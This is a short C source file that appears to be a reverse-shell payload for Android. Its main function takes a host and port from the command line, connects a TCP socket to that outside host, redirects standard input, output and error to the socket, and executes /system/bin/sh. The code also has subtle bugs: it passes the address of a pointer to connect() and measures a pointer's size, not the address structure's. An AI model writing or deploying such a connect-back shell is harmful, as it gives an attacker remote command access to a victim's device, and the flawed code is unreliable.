#include <stdlib.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

void connect_back(struct sockaddr_in *server) 
{
  int sock;
  int desc = 3;
  sock = socket(PF_INET, SOCK_STREAM, 0);
  connect(sock, (struct sockaddr *) &server, sizeof server) ;
  while (desc)
    dup2(sock, --desc);
  char *args[] = { "/system/bin/sh", NULL};
  execve(args[0], args, NULL);
}

int main(int argc, char *argv[]) {
  struct hostent *hp = gethostbyname(argv[1]);
  struct sockaddr_in server;
  memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
  server.sin_port = htons(atoi(argv[2]));
  server.sin_family = AF_INET;
  connect_back(&server);
}
